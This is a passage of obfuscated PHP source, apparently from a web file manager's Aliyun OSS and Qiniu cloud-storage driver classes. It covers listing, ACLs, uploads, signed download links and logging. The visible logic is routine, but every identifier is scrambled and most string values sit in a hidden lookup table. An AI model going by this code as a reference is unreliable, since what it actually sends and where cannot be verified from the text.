$†ÈÜÛæ³; } public function listPath($ÚÜáÀ–ƒ, $‚¿ÀÂáú = false) { $æ‡øÛœï =& $_SERVER[¦»×‡Ãã]; $ƒ„Š¸ = $this->fileList($ÚÜáÀ–ƒ, $æ‡øÛœï[8], !0); foreach ($ƒ„Š¸[$æ‡øÛœï[85]] as $ì³Ä‡ ú => $ïƒ­›) { $ƒ„Š¸[$æ‡øÛœï[85]][$ì³Ä‡ ú] = $this->folderInfo($ïƒ­›, $‚¿ÀÂáú, $ïƒ­›); } foreach ($ƒ„Š¸[$æ‡øÛœï[86]] as $ì³Ä‡ ú => $ïƒ­›) { $ƒ„Š¸[$æ‡øÛœï[86]][$ì³Ä‡ ú] = $this->fileInfo($ïƒ­›[$æ‡øÛœï[32]], $‚¿ÀÂáú, $ïƒ­›); } return $ƒ„Š¸; } protected function infoChildren($ùÚéìÊ», &$¹©ı²) { $õ§İöê” =& $_SERVER[¦»×‡Ãã]; $ÌÃÆ·ıœ = $this->fileList($ùÚéìÊ», $õ§İöê”[12], !0); $¹©ı²[$õ§İöê”[81]] += count($ÌÃÆ·ıœ[$õ§İöê”[85]]); $¹©ı²[$õ§İöê”[80]] += count($ÌÃÆ·ıœ[$õ§İöê”[86]]); foreach ($ÌÃÆ·ıœ[$õ§İöê”[86]] as $‰íÚÀÍ˜) { if (!$‰íÚÀÍ˜ || !$‰íÚÀÍ˜[$õ§İöê”[79]]) { continue; } $¹©ı²[$õ§İöê”[79]] += $‰íÚÀÍ˜[$õ§İöê”[79]]; } } public function has($›²’š×, $Ë–ÆßÓ = false, $‹ìåÃÙ÷ = true) { $âì„‡Ò¡ =& $_SERVER[¦»×‡Ãã]; $›²’š× = trim($›²’š×, $âì„‡Ò¡[8]); $´ÖçíÌÈ = empty($›²’š×) && $›²’š× !== $âì„‡Ò¡[228] ? $âì„‡Ò¡[12] : $›²’š× . $âì„‡Ò¡[8]; $µ«üÈ¿í = $âì„‡Ò¡[12]; $Âè¬÷š¢ = 500; $ÔØÏ¬ÇŞ = $È˜ÍÏŒ† = 0; while (!0) { check_abort(); $Ç´ˆÑÂë = array($âì„‡Ò¡[1473] => $âì„‡Ò¡[8], $âì„‡Ò¡[1474] => $´ÖçíÌÈ, $âì„‡Ò¡[1475] => $Âè¬÷š¢, $âì„‡Ò¡[1476] => $µ«üÈ¿í); try { $«ùÙ·¥Ï = $this->client->listObjects($this->bucket, $Ç´ˆÑÂë); } catch (OSS\Core\OssException $òºšëÁÂ) { $this->writeLog(__FUNCTION__ . $âì„‡Ò¡[214] . $òºšëÁÂ->getMessage()); break; } $µ«üÈ¿í = $«ùÙ·¥Ï->getNextMarker(); $·°‡‡Î¯ = $«ùÙ·¥Ï->getObjectList(); $åÖé’·‰ = $«ùÙ·¥Ï->getPrefixList(); if ($Ë–ÆßÓ) { if (count($·°‡‡Î¯) > 1 || count($·°‡‡Î¯) == 1 && $·°‡‡Î¯[0]->getKey() != $´ÖçíÌÈ) { $ÔØÏ¬ÇŞ += count($·°‡‡Î¯) - 1; } if (!empty($åÖé’·‰)) { $È˜ÍÏŒ† += count($åÖé’·‰); } if ($µ«üÈ¿í === $âì„‡Ò¡[12]) { break; } continue; } if ($‹ìåÃÙ÷) { if (!empty($·°‡‡Î¯)) { if (count($·°‡‡Î¯) > 1 || $·°‡‡Î¯[0]->getKey() != $´ÖçíÌÈ) { return !0; } } } else { if (!empty($åÖé’·‰)) { return !0; } } if ($µ«üÈ¿í === $âì„‡Ò¡[12]) { break; } } if ($Ë–ÆßÓ) { return array($âì„‡Ò¡[239] => $ÔØÏ¬ÇŞ, $âì„‡Ò¡[240] => $È˜ÍÏŒ†); } return !1; } public function listAll($ÑÀ‚Îø’) { $Ğ¹Ş¨¶Ò =& $_SERVER[¦»×‡Ãã]; $Î°¢”‡ = $this->fileList($ÑÀ‚Îø’, $Ğ¹Ş¨¶Ò[12], !0); $õÂÆ„šé = array_to_keyvalue($Î°¢”‡[$Ğ¹Ş¨¶Ò[86]], $Ğ¹Ş¨¶Ò[32]); foreach ($Î°¢”‡[$Ğ¹Ş¨¶Ò[85]] as $÷¼ ùî) { if (is_string($÷¼ ùî)) { $õÂÆ„šé[$÷¼ ùî] = array($Ğ¹Ş¨¶Ò[79] => 0); } } return $this->listAllFiles($ÑÀ‚Îø’, $õÂÆ„šé); } public function canRead($•ïïñ«ˆ) { $¤ßÆæıˆ =& $_SERVER[¦»×‡Ãã]; $Öû‘¡²ë = $this->pathAcl($•ïïñ«ˆ); return $Öû‘¡²ë == $¤ßÆæıˆ[1483] || $Öû‘¡²ë == $¤ßÆæıˆ[619] ? !0 : !1; } public function canWrite($¤³‡) { $£¿÷öã = $this->pathAcl($¤³‡); return $£¿÷öã == $_SERVER[¦»×‡Ãã][619] ? !0 : !1; } public function pathAcl($Í¶ïâÜ) { $˜Ìõó¾Ä =& $_SERVER[¦»×‡Ãã]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¬Ù˜ã« = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Í¶ïâÜ)); } catch (OSS\Core\OssException $„’ò‘ùú) { $this->writeLog(__FUNCTION__ . $˜Ìõó¾Ä[214] . $„’ò‘ùú->getMessage()); return !1; } $á¢î«ÄÄ = $¬Ù˜ã« == $˜Ìõó¾Ä[37] ? $this->bucketAcl : $¬Ù˜ã«; if ($á¢î«ÄÄ == $˜Ìõó¾Ä[1484]) { return $˜Ìõó¾Ä[1483]; } if ($á¢î«ÄÄ == $˜Ìõó¾Ä[1485]) { return $˜Ìõó¾Ä[619]; } return $á¢î«ÄÄ; } private function chmodPath($Ï¦½Ìœ÷, $Šğş†Ä = '') { $½ƒˆŠÂ‹ =& $_SERVER[¦»×‡Ãã]; $’ÓõÊÏï = empty($Šğş†Ä) ? $½ƒˆŠÂ‹[1485] : $Šğş†Ä; $Á±’‡‡ = array($½ƒˆŠÂ‹[37], $½ƒˆŠÂ‹[229], $½ƒˆŠÂ‹[1484], $½ƒˆŠÂ‹[1485]); if (!in_array($’ÓõÊÏï, $Á±’‡‡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ï¦½Ìœ÷), $’ÓõÊÏï); } catch (OSS\Core\OssException $°•Ç„ä’) { $this->writeLog(__FUNCTION__ . $½ƒˆŠÂ‹[214] . $°•Ç„ä’->getMessage()); return !1; } return !0; } public function getContent($ÛÔèÏÇ¯) { return $this->fileSubstr($ÛÔèÏÇ¯, -1); } public function setContent($ÖìÏË¥ª, $óñÂçƒ = '') { $¹½¯¢ÎË =& $_SERVER[¦»×‡Ãã]; try { $‘ì‘Íë¡ = $this->trafficLimit($¹½¯¢ÎË[1486]); $…Š»ó‹ = $this->client->putObject($this->bucket, $this->pathEncode($ÖìÏË¥ª), $óñÂçƒ, $‘ì‘Íë¡); } catch (OSS\Core\OssException $ŒİúñË) { $this->writeLog(__FUNCTION__ . $¹½¯¢ÎË[214] . $ŒİúñË->getMessage()); return !1; } $ñö˜å´˜ = array($¹½¯¢ÎË[1480] => trim($…Š»ó‹[$¹½¯¢ÎË[1477]], $¹½¯¢ÎË[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÖìÏË¥ª))); $this->updateObjMeta($ÖìÏË¥ª, $ñö˜å´˜); return isset($…Š»ó‹[$¹½¯¢ÎË[1487]][$¹½¯¢ÎË[292]]) ? !0 : !1; } private function updateObjMeta($¥¥İ‹âØ, $ÈÚ±Ë×Â) { $¥¥İ‹âØ = $this->pathEncode($¥¥İ‹âØ); try { $±‡öÕµ• = array(OSS\OssClient::OSS_HEADERS => $ÈÚ±Ë×Â); $this->client->copyObject($this->bucket, $¥¥İ‹âØ, $this->bucket, $¥¥İ‹âØ, $±‡öÕµ•); } catch (OSS\Core\OssException $½½Õ¸¬) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][214] . $½½Õ¸¬->getMessage()); return !1; } return !0; } public function upload($Ö‰†ı†Ö, $‰ùò ç, $ı‹©‹îã = false, $½–¤Øô = REPEAT_REPLACE) { $‚Ëà¥»— =& $_SERVER[¦»×‡Ãã]; $¥‘şê¶Î = trim($Ö‰†ı†Ö, $‚Ëà¥»—[8]); $Öê’º«‰ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($‚Ëà¥»—[1480] => @md5_file($‰ùò ç)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ö‰†ı†Ö))); $Öê’º«‰ = $this->trafficLimit($‚Ëà¥»—[1486], $Öê’º«‰); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¥‘şê¶Î), $‰ùò ç, $Öê’º«‰); } catch (OSS\Core\OssException $†›˜„¾©) { $this->writeLog(__FUNCTION__ . $‚Ëà¥»—[214] . $†›˜„¾©->getMessage()); return !1; } return $this->getPathOuter($Ö‰†ı†Ö); } public function getHost() { $§Ì—ğ²Æ =& $_SERVER[¦»×‡Ãã]; $…˜‰ñ¾Ü = explode($§Ì—ğ²Æ[210], parent::getHost()); return $…˜‰ñ¾Ü[0] . $§Ì—ğ²Æ[210] . $this->bucket . $§Ì—ğ²Æ[10] . $…˜‰ñ¾Ü[1]; } public function uploadFormData($°¿ºñÙÏ, $ƒûÒºÄ‚ = 3600) { $œ”’…« =& $_SERVER[¦»×‡Ãã]; if (!($¿ØÅâÌ¡ = $this->getHost())) { return !1; } $Æãá° = $ƒûÒºÄ‚; $‡™¨Ò« = date($œ”’…«[1488], time() + $Æãá°); $ß¸Á»ŠÖ = new DateTime($‡™¨Ò«); $ûÊ™Ô–« = $ß¸Á»ŠÖ->format(DateTime::ISO8601); $öùÓä­’ = strpos($ûÊ™Ô–«, $œ”’…«[372]); $ûÊ™Ô–« = substr($ûÊ™Ô–«, 0, $öùÓä­’) . $œ”’…«[1489]; $´ŠûóÓª = 1048576000 * 5; $‡Ê¹Å­ = $this->pathFather($°¿ºñÙÏ); $Üı–µŒø = array($œ”’…«[275] => $ûÊ™Ô–«, $œ”’…«[278] => array(array($œ”’…«[1490], 0, $´ŠûóÓª), array($œ”’…«[281], $œ”’…«[282], $‡Ê¹Å­))); $åÍÅòäà = base64_encode(json_encode($Üı–µŒø)); $‹Æä´ˆ = base64_encode(hash_hmac($œ”’…«[263], $åÍÅòäà, $this->secret, !0)); $÷ÏŞ©‡ê = array($œ”’…«[293] => $åÍÅòäà, $œ”’…«[1491] => $this->accessKey, $œ”’…«[285] => $œ”’…«[274], $œ”’…«[1492] => $‹Æä´ˆ, $œ”’…«[208] => $¿ØÅâÌ¡); $÷ÏŞ©‡ê = $this->trafficLimit($œ”’…«[1486], $÷ÏŞ©‡ê); return $÷ÏŞ©‡ê; } public function multiUploadFormData($Ó¼ÎÀÙ¿, $ıß’­âø = 3600) { $ƒË…íÅƒ =& $_SERVER[¦»×‡Ãã]; if (!($âÏÇ€º¾ = $this->getHost())) { return !1; } $‹Êø¾™… = $this->trafficLimit($ƒË…íÅƒ[1486]); $–´–¯«Ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ó¼ÎÀÙ¿), $‹Êø¾™…); return array($ƒË…íÅƒ[254] => $–´–¯«Ó, $ƒË…íÅƒ[208] => $âÏÇ€º¾ . $ƒË…íÅƒ[8] . $this->pathEncode($Ó¼ÎÀÙ¿), $ƒË…íÅƒ[255] => gmdate($ƒË…íÅƒ[1493]), $ƒË…íÅƒ[97] => $Ó¼ÎÀÙ¿); } public function multiUploadAuthData($„èá¿, $Ê½Ìç¦ò = array()) { $ÅÂå¥Õ‘ =& $_SERVER[¦»×‡Ãã]; $¶œ°õîĞ = isset($Ê½Ìç¦ò[$ÅÂå¥Õ‘[255]]) ? $Ê½Ìç¦ò[$ÅÂå¥Õ‘[255]] : gmdate($ÅÂå¥Õ‘[1493]); $šÄù™¥¥ = isset($Ê½Ìç¦ò[$ÅÂå¥Õ‘[169]]) ? $Ê½Ìç¦ò[$ÅÂå¥Õ‘[169]] : $ÅÂå¥Õ‘[12]; $óîĞë¾ = $„èá¿; if (isset($Ê½Ìç¦ò[$ÅÂå¥Õ‘[97]])) { $óîĞë¾ = $Ê½Ìç¦ò[$ÅÂå¥Õ‘[97]]; unset($Ê½Ìç¦ò[$ÅÂå¥Õ‘[97]]); } if (isset($Ê½Ìç¦ò[$ÅÂå¥Õ‘[256]])) { $Ê½Ìç¦ò[$ÅÂå¥Õ‘[255]] = $¶œ°õîĞ; return $this->listUploadParts($óîĞë¾, $Ê½Ìç¦ò); } $¿×ö Ò = array($ÅÂå¥Õ‘[257], $ÅÂå¥Õ‘[12], $ÅÂå¥Õ‘[123], $¶œ°õîĞ, "\x78\55\x6f\163\163\55\144\x61\x74\x65\72{$¶œ°õîĞ}", $ÅÂå¥Õ‘[8] . $this->bucket . $ÅÂå¥Õ‘[8] . $óîĞë¾ . $šÄù™¥¥); if (strpos($šÄù™¥¥, $ÅÂå¥Õ‘[258]) === 0) { $¿×ö Ò[0] = $ÅÂå¥Õ‘[259]; if ($‡¢î½ÎÎ = $this->trafficLimit($ÅÂå¥Õ‘[1486])) { $óîĞë¾ = $ÅÂå¥Õ‘[1494]; array_splice($¿×ö Ò, 5, 0, $óîĞë¾ . $ÅÂå¥Õ‘[4] . $‡¢î½ÎÎ[$óîĞë¾]); } } if (isset($Ê½Ìç¦ò[$ÅÂå¥Õ‘[260]]) && $Ê½Ìç¦ò[$ÅÂå¥Õ‘[260]] == $ÅÂå¥Õ‘[261]) { $¿×ö Ò[0] = $ÅÂå¥Õ‘[261]; } if (!empty($Ê½Ìç¦ò[$ÅÂå¥Õ‘[1495]])) { $áÊá“÷Ş = array_merge(array($¿×ö Ò[4]), $Ê½Ìç¦ò[$ÅÂå¥Õ‘[1495]]); sort($áÊá“÷Ş); $¿×ö Ò[4] = implode($ÅÂå¥Õ‘[262], $áÊá“÷Ş); } $ÏÖ«Ãáà = implode($ÅÂå¥Õ‘[262], $¿×ö Ò); $³š¢Ø«º = base64_encode(hash_hmac($ÅÂå¥Õ‘[263], $ÏÖ«Ãáà, $this->secret, !0)); $àĞŸÕÆ› = $ÅÂå¥Õ‘[1463] . $this->accessKey . $ÅÂå¥Õ‘[4] . $³š¢Ø«º; if (strpos($šÄù™¥¥, $ÅÂå¥Õ‘[258]) === 0) { $àĞŸÕÆ› = array($ÅÂå¥Õ‘[265] => $àĞŸÕÆ›, $ÅÂå¥Õ‘[255] => $¶œ°õîĞ); if ($‡¢î½ÎÎ) { $àĞŸÕÆ› = array_merge($àĞŸÕÆ›, $‡¢î½ÎÎ); } } return $àĞŸÕÆ›; } public function listUploadParts($Ë’şÀ‹Ô, $Ù¼ÚàØ) { $½–×’Ä =& $_SERVER[¦»×‡Ãã]; $š‘ó² = parse_url_query($Ù¼ÚàØ[$½–×’Ä[169]]); $éï€ß­¾ = $this->client->listParts($this->bucket, $this->pathEncode($Ë’şÀ‹Ô), $š‘ó²[$½–×’Ä[254]]); $ÅãĞ‚ñ = $éï€ß­¾->getListPart(); $º›§ªÃ = array(); foreach ($ÅãĞ‚ñ as $³©¨âåŸ) { $º›§ªÃ[] = array($½–×’Ä[308] => $³©¨âåŸ->getPartNumber(), $½–×’Ä[309] => trim($³©¨âåŸ->getETag(), $½–×’Ä[121])); } unset($Ù¼ÚàØ[$½–×’Ä[256]], $Ù¼ÚàØ[$½–×’Ä[260]]); $˜‘êâé¢ = $this->multiUploadAuthData($Ë’şÀ‹Ô, $Ù¼ÚàØ); if (empty($˜‘êâé¢)) { return !1; } return array($½–×’Ä[265] => $˜‘êâé¢, $½–×’Ä[255] => $Ù¼ÚàØ[$½–×’Ä[255]], $½–×’Ä[267] => $º›§ªÃ); } public function download($ãê‚‚Ú¹, $áç‚’„˜) { $ ÌÁ¨™û =& $_SERVER[¦»×‡Ãã]; if ($this->isFolder($ãê‚‚Ú¹)) { return !1; } try { $²Ç˜¯¤È = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $áç‚’„˜); $²Ç˜¯¤È = $this->trafficLimit($ ÌÁ¨™û[112], $²Ç˜¯¤È); $this->client->getObject($this->bucket, $this->pathEncode($ãê‚‚Ú¹), $²Ç˜¯¤È); } catch (OSS\Core\OssException $ß€€¹) { $this->writeLog(__FUNCTION__ . $ ÌÁ¨™û[214] . $ß€€¹->getMessage()); return !1; } return $áç‚’„˜; } public function fileSubstr($ºŞëÉ–Ç, $Û½½ËÒ = 0, $Ó™´šÉ = false) { if ($Û½½ËÒ === -1) { $Ø’½°Ö¾ = array(); } else { if ($Ó™´šÉ === !1) { $Š–Ëã±“ = $this->size($ºŞëÉ–Ç); } else { $Š–Ëã±“ = $Û½½ËÒ + $Ó™´šÉ - 1; } $Ø’½°Ö¾ = array(OSS\OssClient::OSS_RANGE => "{$Û½½ËÒ}\x2d{$Š–Ëã±“}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ºŞëÉ–Ç), $Ø’½°Ö¾); } catch (OSS\Core\OssException $ó›ú½˜) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][214] . $ó›ú½˜->getMessage()); think_exception($ó›ú½˜->getMessage()); return !1; } } private function trafficLimit($òÏ£›ï³, $ï† õ–ß = array()) { $÷ç­ôõÁ =& $_SERVER[¦»×‡Ãã]; if ($òÏ£›ï³ == $÷ç­ôõÁ[1486] && $this->isUploadServer() || $òÏ£›ï³ == $÷ç­ôõÁ[112] && $this->isFileOutServer()) { return $ï† õ–ß; } $áÍû÷‘ = floatval($GLOBALS[$÷ç­ôõÁ[6]][$÷ç­ôõÁ[92]][$÷ç­ôõÁ[110]][$òÏ£›ï³]) * 1024 * 1024 * 8; if (!$áÍû÷‘) { return $ï† õ–ß; } $áÍû÷‘ = $áÍû÷‘ < 819200 ? 819200 : ($áÍû÷‘ > 838860800 ? 838860800 : $áÍû÷‘); $ï† õ–ß[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($áÍû÷‘); return $ï† õ–ß; } public function link($†éŞıÀ, $õ†Ğ¯ÊÚ = array()) { $·‰à›‹ =& $_SERVER[¦»×‡Ãã]; if (!$this->exist($†éŞıÀ) || $this->isFolder($†éŞıÀ)) { return !1; } try { $õ†Ğ¯ÊÚ = $this->trafficLimit($·‰à›‹[112], $õ†Ğ¯ÊÚ); $óúëß˜ = $this->client->signUrl($this->bucket, $this->pathEncode($†éŞıÀ), 3600 * 12, $·‰à›‹[261], $õ†Ğ¯ÊÚ); return $this->getCdnLink($óúëß˜); } catch (OSS\Core\OssException $ïÍŠ‰ıì) { $this->writeLog(__FUNCTION__ . $·‰à›‹[214] . $ïÍŠ‰ıì->getMessage()); return !1; } } public function fileOut($‡ÒïãÉ, $İ›¨²„¥ = false, $ğÛú±ÈÌ = false, $ù­°ùö¤ = '') { $»‰õ¼•µ =& $_SERVER[¦»×‡Ãã]; if ($this->isFileOutServer()) { return $this->fileOutServer($‡ÒïãÉ, $İ›¨²„¥, $ğÛú±ÈÌ, $ù­°ùö¤); } if (!$ğÛú±ÈÌ) { $ğÛú±ÈÌ = $this->pathThis($‡ÒïãÉ); } $ğÛú±ÈÌ = rawurlencode($ğÛú±ÈÌ); $¹İ©Èö = get_file_mime(get_path_ext($ğÛú±ÈÌ)); if ($¹İ©Èö == $»‰õ¼•µ[248]) { return parent::fileOut($‡ÒïãÉ, $İ›¨²„¥, $ğÛú±ÈÌ, $ù­°ùö¤); } $İ›¨²„¥ = $İ›¨²„¥ ? $»‰õ¼•µ[1496] : $»‰õ¼•µ[1497]; $Ö›õŞ¯¡ = array(OSS\OssClient::OSS_SUB_RESOURCE => $»‰õ¼•µ[1498] . rawurlencode("{$İ›¨²„¥}\73\x66\151\x6c\145\156\x61\155\145\75{$ğÛú±ÈÌ}")); $Ö›õŞ¯¡[OSS\OssClient::OSS_SUB_RESOURCE] .= $»‰õ¼•µ[1499] . rawurlencode($¹İ©Èö); $ƒÃŠ™Å‰ = $this->link($‡ÒïãÉ, $Ö›õŞ¯¡); $this->fileOutLink($ƒÃŠ™Å‰); } public function fileOutServer($¬•¸º§², $…’€‡ = false, $°¿÷ã÷Õ = false, $‹ß××ØÕ = '') { parent::fileOut($¬•¸º§², $…’€‡, $°¿÷ã÷Õ, $‹ß××ØÕ); } public function fileOutImage($ëïå¶ü, $Ò˜ëê´ = 250) { if ($this->size($ëïå¶ü) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ëïå¶ü, $Ò˜ëê´); } $à¡ñ™Àü = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¦»×‡Ãã][1460] . $Ò˜ëê´); $‡†½ÖŸø = $this->link($ëïå¶ü, $à¡ñ™Àü); $this->fileOutLink($‡†½ÖŸø); } public function fileOutImageServer($Ö ƒ¿±†, $Ğéü©Å = 250) { parent::fileOutImage($Ö ƒ¿±†, $Ğéü©Å); } public function fileOutLink($î¼Ô£„Ã) { $ ¬Ïç…Ô =& $_SERVER[¦»×‡Ãã]; if (!$this->isCdnHost() && substr($î¼Ô£„Ã, 0, 7) == $ ¬Ïç…Ô[313]) { $î¼Ô£„Ã = $ ¬Ïç…Ô[314] . substr($î¼Ô£„Ã, 7); } header($ ¬Ïç…Ô[175] . $î¼Ô£„Ã); die; } public function hashMd5($ó¬ç¢†÷, $¶ê……ú = '') { $ç¤œ²ëø =& $_SERVER[¦»×‡Ãã]; $·¾Êä³§ = $this->_objectMeta($ó¬ç¢†÷); if (!$·¾Êä³§) { return $ç¤œ²ëø[12]; } if (!isset($·¾Êä³§[$ç¤œ²ëø[1480]]) && !empty($¶ê……ú)) { $²¾ø¢üû = $this->updateObjMeta($ó¬ç¢†÷, array($ç¤œ²ëø[1480] => $¶ê……ú)); $·¾Êä³§[$ç¤œ²ëø[1480]] = $²¾ø¢üû ? $¶ê……ú : $ç¤œ²ëø[12]; } return isset($·¾Êä³§[$ç¤œ²ëø[1480]]) ? strtolower($·¾Êä³§[$ç¤œ²ëø[1480]]) : $ç¤œ²ëø[12]; } public function size($–üŞ¯Ü—) { $°åÒ¨ç­ = $this->objectMeta($–üŞ¯Ü—); return $°åÒ¨ç­ ? $°åÒ¨ç­[$_SERVER[¦»×‡Ãã][79]] : 0; } public function info($Ú›şÓ€¸) { if ($this->isFolder($Ú›şÓ€¸)) { return $this->folderInfo($Ú›şÓ€¸); } else { if ($this->isFile($Ú›şÓ€¸)) { return $this->fileInfo($Ú›şÓ€¸); } } return !1; } public function exist($µŠœ’·ø) { return $this->isFile($µŠœ’·ø) || $this->isFolder($µŠœ’·ø); } public function isFile($»ñáãâ‘) { return !$this->isFolder($»ñáãâ‘) && $this->objectMeta($»ñáãâ‘); } public function isFolder($ú†–É§¤) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][179], $ú†–É§¤); } protected function objectMeta($«ø´‰–·) { return $this->cacheMethod($_SERVER[¦»×‡Ãã][181], $«ø´‰–·); } protected function _objectMeta($Ø‚Ü²ñ—) { $°ğÕÖåÜ =& $_SERVER[¦»×‡Ãã]; try { $íÆŠ ÷— = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ø‚Ü²ñ—)); } catch (OSS\Core\OssException $û˜º®ê) { $this->writeLog(__FUNCTION__ . $°ğÕÖåÜ[214] . $û˜º®ê->getMessage()); $íÆŠ ÷— = !1; } if ($íÆŠ ÷—) { $íÆŠ ÷—[$°ğÕÖåÜ[79]] = intval($íÆŠ ÷—[$°ğÕÖåÜ[1478]]); } return $íÆŠ ÷—; } protected function _isFolder($ˆ®µÀ•) { $öÀæ×ö =& $_SERVER[¦»×‡Ãã]; if ($ˆ®µÀ• == $öÀæ×ö[12] || $ˆ®µÀ• == $öÀæ×ö[8]) { return !0; } $ÁÀé “ = array($öÀæ×ö[1473] => $öÀæ×ö[8], $öÀæ×ö[1474] => rtrim($ˆ®µÀ•, $öÀæ×ö[8]) . $öÀæ×ö[8], $öÀæ×ö[1475] => 1, $öÀæ×ö[1476] => $öÀæ×ö[12]); $®Ø¨ôìĞ = $this->client->listObjects($this->bucket, $ÁÀé “); if ($®Ø¨ôìĞ->getObjectList() || $®Ø¨ôìĞ->getPrefixList()) { return !0; } return !1; } public function writeLog($ÙÁşŸªœ = '', $ÈƒŸí·ğ = false) { $êé÷ß£Â =& $_SERVER[¦»×‡Ãã]; $ó÷¢­Šá = in_array(ACTION, array($êé÷ß£Â[212], $êé÷ß£Â[213])); if (!$ó÷¢­Šá && !GLOBAL_DEBUG) { return; } $Ã„¤ñª¢ = 0; if (stripos($ÙÁşŸªœ, $êé÷ß£Â[1500]) !== !1) { $Ã„¤ñª¢ = 1; $—ÂùåªÜ = explode($êé÷ß£Â[1501], $ÙÁşŸªœ); $ÙÁşŸªœ = !empty($—ÂùåªÜ[1]) ? $—ÂùåªÜ[1] : $ÙÁşŸªœ; } else { if (stripos($ÙÁşŸªœ, $êé÷ß£Â[1502])) { $Ã„¤ñª¢ = 2; $—ÂùåªÜ = explode($êé÷ß£Â[1502], $ÙÁşŸªœ); $—ÂùåªÜ = explode($êé÷ß£Â[4], $—ÂùåªÜ[0]); $ÙÁşŸªœ = !empty($—ÂùåªÜ[1]) ? $—ÂùåªÜ[1] : $ÙÁşŸªœ; } } if ($ó÷¢­Šá && I18n::getType() == $êé÷ß£Â[1503]) { if ($Ã„¤ñª¢ == 1) { $ÙÁşŸªœ = str_replace($êé÷ß£Â[1504], $êé÷ß£Â[1505], $ÙÁşŸªœ); } else { if ($Ã„¤ñª¢ == 2) { $—ÂùåªÜ = explode($êé÷ß£Â[214], $—ÂùåªÜ[0]); $Á®¼åº› = isset($—ÂùåªÜ[1]) ? $—ÂùåªÜ[1] : $êé÷ß£Â[12]; $¦ßÕ™• = array($êé÷ß£Â[1506] => $êé÷ß£Â[1507], $êé÷ß£Â[1508] => $êé÷ß£Â[1509], $êé÷ß£Â[1510] => $êé÷ß£Â[1511], $êé÷ß£Â[1512] => $êé÷ß£Â[1513], $êé÷ß£Â[1514] => $êé÷ß£Â[1515], $êé÷ß£Â[1516] => $êé÷ß£Â[1517], $êé÷ß£Â[1518] => $êé÷ß£Â[1519], $êé÷ß£Â[1520] => $êé÷ß£Â[1521], $êé÷ß£Â[1522] => $êé÷ß£Â[1523], $êé÷ß£Â[1524] => $êé÷ß£Â[1525]); if (isset($¦ßÕ™•[$Á®¼åº›])) { $ÙÁşŸªœ = $¦ßÕ™•[$Á®¼åº›]; } } } if (stripos($ÙÁşŸªœ, $êé÷ß£Â[1526])) { $ÙÁşŸªœ = $êé÷ß£Â[1527]; } } if (!trim($ÙÁşŸªœ)) { return; } parent::writeLog(trim($ÙÁşŸªœ), $ÈƒŸí·ğ); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¶¨¡é§é) { parent::__construct(); require_once SDK_DIR . $_SERVER[¦»×‡Ãã][1528]; $this->_init($¶¨¡é§é); } public function _init($ùƒèÚŒË) { $Ã—ÖÍîÊ =& $_SERVER[¦»×‡Ãã]; $this->config = $ùƒèÚŒË; foreach ($ùƒèÚŒË as $Ş…´¿Ò => $ı­Ä§ÔŸ) { if (isset($this->{$Ş…´¿Ò})) { $this->{$Ş…´¿Ò} = $ı­Ä§ÔŸ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ã—ÖÍîÊ[1529] . LNG($Ã—ÖÍîÊ[1464])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($å™ºÑó’, $şÖşù¾× = '', $ĞĞÀä‡ = REPEAT_RENAME) { if ($this->setContent($å™ºÑó’, $şÖşù¾×)) { return $this->getPathOuter($å™ºÑó’); } return !1; } public function mkdir($Ë¼¼Âş½, $Úã¶º–º = REPEAT_SKIP) { $²ˆÉñ‘· =& $_SERVER[¦»×‡Ãã]; $•©‡Š¾¨ = trim($Ë¼¼Âş½, $²ˆÉñ‘·[8]); if ($this->_isFolder($•©‡Š¾¨)) { return $this->getPathOuter($•©‡Š¾¨); } $Ë¼¼Âş½ = $•©‡Š¾¨ . $²ˆÉñ‘·[8]; $óö¨í¤Ô = get_path_this($•©‡Š¾¨); $Å¾€ÇÅù = $Ë¼¼Âş½ . $óö¨í¤Ô; if (!$this->mkfile($Å¾€ÇÅù)) { return !1; } if (!$this->moveFile($Å¾€ÇÅù, $Ë¼¼Âş½)) { $this->delFile($Å¾€ÇÅù); return !1; } return $this->getPathOuter($•©‡Š¾¨); } public function copyFile($ÆÎ ºÜÅ, $×Áøıãµ) { $İÙå”ˆı = $this->bucketManager->copy($this->bucket, $ÆÎ ºÜÅ, $this->bucket, $×Áøıãµ, !0); return $İÙå”ˆı ? !1 : $this->getPathOuter($×Áøıãµ); } public function moveFile($«º¶¬ğ, $¡ßšèÃª) { $ãÃŸ¥Û = $this->bucketManager->move($this->bucket, $«º¶¬ğ, $this->bucket, $¡ßšèÃª, !0); return $ãÃŸ¥Û ? !1 : $this->getPathOuter($¡ßšèÃª); } public function delFile($ìóŠ¥ï) { if (!$this->exist($ìóŠ¥ï)) { return !0; } $¯íîµôÈ = $this->bucketManager->delete($this->bucket, $ìóŠ¥ï); return $¯íîµôÈ ? !1 : !0; } public function delFolder($™¸£¦¥µ) { 